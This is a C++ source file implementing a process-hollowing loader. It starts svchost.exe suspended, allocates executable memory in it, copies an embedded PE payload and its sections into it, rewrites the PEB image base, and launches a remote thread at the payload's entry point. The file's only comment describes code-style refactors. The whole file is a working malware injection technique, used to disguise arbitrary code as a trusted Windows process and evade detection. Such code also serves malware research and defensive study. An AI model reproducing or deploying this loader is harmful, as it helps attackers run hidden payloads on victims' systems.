#include "pe.h"
#include <Windows.h>
#include <iostream>
#include <memory>
#include <strsafe.h>

/*
 *
std::make_unique for memory allocation
used reinterpret_cast instead of C-style casts
replaced pointer arithmetic with reinterpret_cast for better type safety
used pre-increment for better performance.
using nullptr in function calls for better readability

*/


int main() {
    auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(raw_data);
    auto nt_header = get_nt_header(dos_header);

    auto process_info_ { std::make_unique<PROCESS_INFORMATION>() };
    STARTUPINFO si { sizeof(si) };

    ULONG retLength;
    PROCESS_BASIC_INFORMATION pbi;
    PVOID newImageBase;
    _PEB *imageBaseAddr;

    HMODULE ntDll = LoadLibraryA("ntdll.dll");
    auto ntQueryInfoProcess = reinterpret_cast<NTQUERYINFOPROC>(GetProcAddress(ntDll, "NtQueryInformationProcess"));

    if (nt_header->Signature != IMAGE_NT_SIGNATURE) {
        return 1;
    }

    CreateProcess(R"(C:\Windows\System32\svchost.exe)",
                  nullptr, nullptr, nullptr, FALSE,
                  CREATE_SUSPENDED,
                  nullptr, nullptr, &si, process_info_.get());

    ntQueryInfoProcess(
            process_info_->hProcess,
            ProcessBasicInformation,
            &pbi,
            sizeof(PROCESS_BASIC_INFORMATION),
            &retLength);

    newImageBase = VirtualAllocEx(
            process_info_->hProcess,
            nullptr,
            nt_header->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
    );

    WriteProcessMemory(process_info_->hProcess, newImageBase, raw_data, nt_header->OptionalHeader.SizeOfHeaders, nullptr);

    auto sectionHeader = get_section_header(dos_header);
    write_sections(sectionHeader, newImageBase, nt_header, process_info_->hProcess);

    imageBaseAddr = reinterpret_cast<_PEB*>(pbi.PebBaseAddress + 0x10);
    WriteProcessMemory(process_info_->hProcess, imageBaseAddr, &newImageBase, sizeof(newImageBase), nullptr);

    HANDLE newThread = CreateRemoteThread(process_info_->hProcess,
                                          nullptr,
                                          0,
                                          reinterpret_cast<LPTHREAD_START_ROUTINE>(reinterpret_cast<ULONG_PTR>(newImageBase) + nt_header->OptionalHeader.AddressOfEntryPoint),
                                          nullptr,
                                          CREATE_SUSPENDED,
                                          nullptr);

    ResumeThread(newThread);
    SuspendThread(process_info_->hThread);

    FreeLibrary(ntDll);
    return 0;
}